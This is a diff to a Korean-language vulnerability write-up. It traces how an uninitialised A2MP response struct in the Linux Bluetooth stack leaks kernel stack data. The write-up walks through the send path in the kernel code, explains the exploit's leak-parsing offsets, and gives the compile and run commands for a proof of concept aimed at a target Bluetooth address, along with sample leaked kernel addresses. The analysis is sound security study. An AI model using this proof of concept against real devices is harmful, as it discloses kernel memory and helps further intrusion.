@@ -281,7 +281,7 @@ static int a2mp_getinfo_req(struct amp_mgr *mgr, struct sk_buff *skb,
 		rsp.id = req->id;
 		rsp.status = A2MP_STATUS_INVALID_CTRL_ID;
 
-    // rsp의 모든 멤버가 초기화되지 않음!
+		// rsp의 모든 멤버가 초기화되지 않음!
 
 		a2mp_send(mgr, A2MP_GETINFO_RSP, hdr->ident, sizeof(rsp),
 			  &rsp);
@@ -481,20 +481,223 @@ packet3.info_req.id = 0x42; // !hdev 가 참이 되어 if문 내로 분기하도
 hci_send_acl_data(hci_socket, hci_handle, &packet3, sizeof(packet3));
 ```
 
-## Analysis #5 응답값 노출
+## Analysis #5 응답 패킷 구조
+스택 데이터를 노출하는 응답값을 송신하도록 조작된 패킷을 보냈으니 응답값에 담겨있는 데이터를 수신해야한다. 우선 취약한 함수부터 패킷 송신 로직을 살펴보자.
 ```c++
-struct a2mp_info_rsp {
-	__u8	id;
-	__u8	status;
-  /* 여기서부터 초기화되지 않아서 stack data가 노출되는 멤버들 */
-	__le32	total_bw;
-	__le32	max_bw;
-	__le32	min_latency;
-	__le16	pal_cap;
-	__le16	assoc_size;
+static int a2mp_getinfo_req(struct amp_mgr *mgr, struct sk_buff *skb,
+			    struct a2mp_cmd *hdr)
+{
+	// ...
+	if (!hdev || hdev->dev_type != HCI_AMP) {
+		struct a2mp_info_rsp rsp;
+
+		rsp.id = req->id;
+		rsp.status = A2MP_STATUS_INVALID_CTRL_ID;
+
+		a2mp_send(mgr, A2MP_GETINFO_RSP, hdr->ident, sizeof(rsp),
+			  &rsp);
+
+		goto done;
+	}
+	// ...
+}
+```
+`a2mp_send()` 함수를 통해 `a2mp_info_rsp` 구조체로 이루어진 응답 데이터를 송신한다. `a2mp_send()` 함수는 아래와 같다.
+```c++
+static void a2mp_send(struct amp_mgr *mgr, u8 code, u8 ident, u16 len, void *data)
+{
+	struct l2cap_chan *chan = mgr->a2mp_chan;
+	struct a2mp_cmd *cmd;
+	u16 total_len = len + sizeof(*cmd);
+	struct kvec iv;
+	struct msghdr msg;
+	cmd = __a2mp_build(code, ident, len, data); // cmd 설정
+	if (!cmd)
+		return;
+  
+
+	// iv 데이터 설정
+	iv.iov_base = cmd;
+	iv.iov_len = total_len;
+
+	memset(&msg, 0, sizeof(msg));
+	iov_iter_kvec(&msg.msg_iter, WRITE, &iv, 1, total_len); // iv 데이터를 msg에 작성
+	l2cap_chan_send(chan, &msg, total_len); // msg를 send
+	// ...
+}
+```
+결과적으로 `msg`를 `l2cap_chan_send()` 함수를 이용해서 송신하지만 이 `msg`는 `iv` 데이터를 가지고 있으며, `iv`구조체는 `cmd` 데이터를 담고있다. `cmd`는 인자로 받은 `data`를 `__a2mp_build()` 함수를 통해 가공해서 생성되었는데, 이 함수를 자세히 보면 다음과 같다.
+```c++
+static struct a2mp_cmd *__a2mp_build(u8 code, u8 ident, u16 len, void *data)
+{
+	struct a2mp_cmd *cmd; // cmd 구조체가 따로 있는 것을 알 수 있음
+	int plen;
+	plen = sizeof(*cmd) + len;
+	cmd = kzalloc(plen, GFP_KERNEL);
+	if (!cmd)
+		return NULL;
+	cmd->code = code;
+	cmd->ident = ident;
+	cmd->len = cpu_to_le16(len);
+
+	memcpy(cmd->data, data, len); // data 필드만 memcpy를 통해 삽입
+
+	return cmd;
+}
+```
+우선 `cmd` 라는 변수가 본 함수의 주요 변수인데, `a2mp_cmd` 구조체로 이루어져 있다.
+```c++
+struct a2mp_cmd {
+	__u8	code;
+	__u8	ident;
+	__le16	len;
+	__u8	data[0];
 } __packed;
 ```
-스택 데이터가 노출되는 `a2mp_info_rsp` 구조체는 위와 같았다.
+위와 같은 구조를 띄고 있고, 다시 코드를 보면, `cmd` 변수에 각 필드를 전달받은 인자를 기준으로 초기화시키는 것을 확인할 수 있다. 그러나 특이한 점은 `cmd->data` 부분만 `memcpy()` 함수를 통해 데이터를 복사한다는 점이다. 인자로 전달받은 `data`는 송신할 데이터. 즉, 스텍 데이터가 노출된 `a2mp_info_rsp` 구조체다. 이 구조체를 `cmd->data`에 넣었기 때문에 구조체에서 구조체를 포함하는 구조로 구성이 된다.
+
+다시 `a2mp_send()` 함수로 돌아가자
+
+```c++
+static void a2mp_send(struct amp_mgr *mgr, u8 code, u8 ident, u16 len, void *data)
+{
+	// ...
+
+	cmd = __a2mp_build(code, ident, len, data); // cmd 설정
+	if (!cmd)
+		return;
+  
+
+	// iv 데이터 설정
+	iv.iov_base = cmd;
+	iv.iov_len = total_len;
+
+	memset(&msg, 0, sizeof(msg));
+	iov_iter_kvec(&msg.msg_iter, WRITE, &iv, 1, total_len); // iv 데이터를 msg에 작성
+	l2cap_chan_send(chan, &msg, total_len); // msg를 send
+
+	// ...
+}
+```
+완성된 `cmd` 데이터가 형태가 최종적으로 `msg`가 되어 `l2cap_chan_send()` 함수를 통해 전송된다.
+```c++
+int l2cap_chan_send(struct l2cap_chan *chan, struct msghdr *msg, size_t len)
+{
+	// ...
+
+	switch (chan->mode) {
+
+	// ...
+
+	case L2CAP_MODE_BASIC:
+		/* Check outgoing MTU */
+		if (len > chan->omtu)
+			return -EMSGSIZE;
+		/* Create a basic PDU */
+		skb = l2cap_create_basic_pdu(chan, msg, len);
+		if (IS_ERR(skb))
+			return PTR_ERR(skb);
+		/* Channel lock is released before requesting new skb and then
+		 * reacquired thus we need to recheck channel state.
+		 */
+		if (chan->state != BT_CONNECTED) {
+			kfree_skb(skb);
+			return -ENOTCONN;
+		}
+		l2cap_do_send(chan, skb);
+		err = len;
+		break;
+
+		// ...
+
+	}
+
+	// ...
+
+}
+```
+exploit 코드를 보면 두 번째 송신 패킷에서 `L2CAP_MODE_BASIC`로 설정했었기 때문에, 위 함수에서도 `L2CAP_MODE_BASIC` case에 걸린다. 전송될 `msg`는 `l2cap_create_basic_pdu()` 함수를 통해 `skb`로 변환되고, 이 `skb`는 `l2cap_do_send()` 함수를 통해 전송됨을 알 수 있다. 데이터를 가공하는 `l2cap_create_basic_pdu()` 함수부터 살펴보자.
+```c++
+static struct sk_buff *l2cap_create_basic_pdu(struct l2cap_chan *chan,
+					      struct msghdr *msg, size_t len)
+{
+	// ...
+
+	/* Create L2CAP header */
+	lh = skb_put(skb, L2CAP_HDR_SIZE); // L2CAP_HDR_SIZE (4)
+	lh->cid = cpu_to_le16(chan->dcid);
+	lh->len = cpu_to_le16(len);
+	
+	// ...
+
+	return skb;
+}
+```
+기존 데이터에 `L2CAP header`를 생성해서 16bit 크기의 `cid`와 `len` 데이터를 삽입한다. 다시 돌아와서 `l2cap_do_send()`부터 흐름을 보면 다음과 같다.
+```c++
+static void l2cap_do_send(struct l2cap_chan *chan, struct sk_buff *skb)
+{
+	// ...
+
+	hci_send_acl(chan->conn->hchan, skb, flags);
+}
+```
+```c++
+void hci_send_acl(struct hci_chan *chan, struct sk_buff *skb, __u16 flags)
+{
+	// ...
+  
+	hci_queue_acl(chan, &chan->data_q, skb, flags);
+	
+	// ..
+}
+```
+`l2cap_do_send()`, `hci_send_acl()`, `hci_queue_acl()` 순서로 함수를 실행한다.
+```c++
+static void hci_queue_acl(struct hci_chan *chan, struct sk_buff_head *queue,
+			  struct sk_buff *skb, __u16 flags)
+{
+	struct hci_conn *conn = chan->conn;
+	struct hci_dev *hdev = conn->hdev;
+	struct sk_buff *list;
+	skb->len = skb_headlen(skb);
+	skb->data_len = 0;
+	hci_skb_pkt_type(skb) = HCI_ACLDATA_PKT; // type 영역에 HCI_ACLDATA_PKT 삽입
+	
+  switch (hdev->dev_type) {
+	case HCI_PRIMARY:
+		hci_add_acl_hdr(skb, conn->handle, flags);
+		break;
+	case HCI_AMP: // 이 case문에 걸림
+		hci_add_acl_hdr(skb, chan->handle, flags);
+		break;
+	default:
+		bt_dev_err(hdev, "unknown dev_type %d", hdev->dev_type);
+		return;
+	}
+
+	list = skb_shinfo(skb)->frag_list; // 패킷 전송을 위한 스케쥴러 등록
+
+	// ...
+}
+```
+`hci_queue_acl()` 함수는 패킷의 type을 나타내는 영역에 `HCI_ACLDATA_PKT` 데이터를 삽입하고, `hci_add_acl_hdr()` 함수를 통해 ACL Header 부분을 채운다. 헤더를 추가하는 부분은 아래와 같다.
+```c++
+static void hci_add_acl_hdr(struct sk_buff *skb, __u16 handle, __u16 flags)
+{
+	// ...
+
+	hdr->handle = cpu_to_le16(hci_handle_pack(handle, flags));
+	hdr->dlen   = cpu_to_le16(len);
+}
+```
+이후 실제로 패킷을 전송한다. 최종적으로 보내는 패킷의 모습은 다음과 같다.
+
+![image](https://user-images.githubusercontent.com/44149738/133655332-1c17dcc1-ef59-461b-a2de-6e28fdc6f32c.png)
+
+
+## Analysis #6 응답 데이터 수신
+아래는 exploit code에 나와있는 수신부 코드이다.
 ```c++
 for (int i = 0; i < 64; i++) {
   char buf[1024] = {0};
@@ -511,15 +714,25 @@ for (int i = 0; i < 64; i++) {
   }
 }
 ```
+주요 line 위주로 분석해보자.
+```c++
+if (buf_size > 0 && buf[0] == HCI_ACLDATA_PKT)
+```
+`buf[0]`가 `HCI_ACLDATA_PKT`임을 확인하여 위에서 분석한 ACL 응답 로직을 통해 송신된 패킷인지 확인할 수 있다.
+```c++
+l2cap_hdr *l2_hdr = (l2cap_hdr *)(buf + 5);
+```
+`HCI_ACLDATA_PKT`가 맞다면 우리가 알고있는 구조로 데이터가 수신되었을 것이기 때문에 `l2cap_hdr` 부분은 `type`과 `hci_acl_hdr` 구조체를 건너뛴 `buf + 5`에 위치하게 될 것이다.
+```c++
+uint64_t leak1 = *(uint64_t *)(buf + 13) & ~0xffff;
+uint64_t leak2 = *(uint64_t *)(buf + 21);
+uint16_t leak3 = *(uint64_t *)(buf + 29);
+```
+결론적으로 우리가 수신하길 원하는 `a2mp_info_rsp` 구조체는 `l2cap_hdr`로부터 8bytes 만큼 뒤에 위치하기 때문에 `buf + 13`에 위치하게 된다. 이를 기준으로 leak1, 2, 3 데이터는 각각 다음과 같은 필드를 포함한다.
 
-TODO
-- 각 오프셋이 무얼 의미하는지 알아보기
-  ```
-    buf + 5 : a2mp_info_rsp 응답 데이터 시작지점
-    buf + 13 : 시작지점 + 8 
-    buf + 21 : 시작지점 + 16
-    buf + 29 : 시작지점 + 24
-  ```
+![image](https://user-images.githubusercontent.com/44149738/133656041-a69da858-5c90-4c17-a533-aa4a793f6f86.png)
+
+`leak1` 부분은 초기화된 `id`와 `status` 필드가 포함되어있기 때문에 하위 2bytes를 `&`연산을 통해 제거해준다.
 
 ## Usage
 POC를 사용하기 위해 `gcc -o poc poc.c -lbluetooth` 명령으로 아래 코드를 컴파일 할 수 있고, 컴파일된 바이너리는 `sudo ./poc 11:22:33:44:55:66` 명령으로 실행할 수 있다. 첫 번째 실행인자 부분에 공격 대상의 bd 주소를 입력하면 된다.
@@ -535,3 +748,4 @@ POC를 사용하기 위해 `gcc -o poc poc.c -lbluetooth` 명령으로 아래 �
 [*] Sending malicious AMP info request...
 [+] Leaked: ffffffff98e00000, ffffffff98e001a4, 1229
 ```
+Leak 된 데이터 중 첫 번째가 하위 바이트가 0으로 초기화되어있어서 처음에 base 주소인줄 알았지만 그저 구조상 2byte를 버린 데이터일 뿐 다른 의미는 없어보인다.
